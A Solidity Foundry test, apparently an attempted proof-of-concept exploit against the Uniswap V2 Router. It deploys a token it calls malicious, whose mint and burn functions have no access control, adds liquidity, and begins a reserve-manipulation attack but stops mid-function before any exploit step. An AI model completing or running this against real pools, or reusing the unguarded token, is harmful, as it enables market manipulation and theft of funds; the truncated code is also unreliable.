pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract TestToken {
    string public name = "Test Token";
    string public symbol = "TEST";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) public {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function mintTo(address to, uint256 amount) public {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function burnFrom(address from, uint256 amount) public {
        require(balanceOf[from] >= amount, "Insufficient balance");
        totalSupply -= amount;
        balanceOf[from] -= amount;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

interface IUniswapV2Pair {
    function sync() external;
    function skim(address to) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address attacker = address(this);
    TestToken public token;
    address public weth;
    address public pair;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get WETH and factory addresses from router
        weth = IUniswapV2Router02(TARGET).WETH();
        address factory = IUniswapV2Router02(TARGET).factory();

        // Deploy malicious token
        token = new TestToken();
        token.mint(address(this), 1000 ether);

        // Approve router to spend tokens
        token.approve(TARGET, type(uint256).max);

        // Add liquidity to create pair
        IUniswapV2Router02(TARGET).addLiquidityETH{value: 50 ether}(
            address(token),
            50 ether, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            address(this),
            block.timestamp + 1000
        );

        // Get pair address
        pair = IUniswapV2Factory(factory).getPair(address(token), weth);

        // Label addresses
        vm.label(address(token), "TestToken");
        vm.label(pair, "Token-WETH Pair");
        vm.label(weth, "WETH");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial ETH balance
        uint256 initialBalance = address(this).balance;

        address weth = IUniswapV2Router02(TARGET).WETH();
        address pair = IUniswapV2Factory(IUniswapV2Router02(TARGET).factory()).getPair(address(token), weth);

        // Manipulate reserves: add WETH to pair to make WETH cheaper
        // First, get some WETH
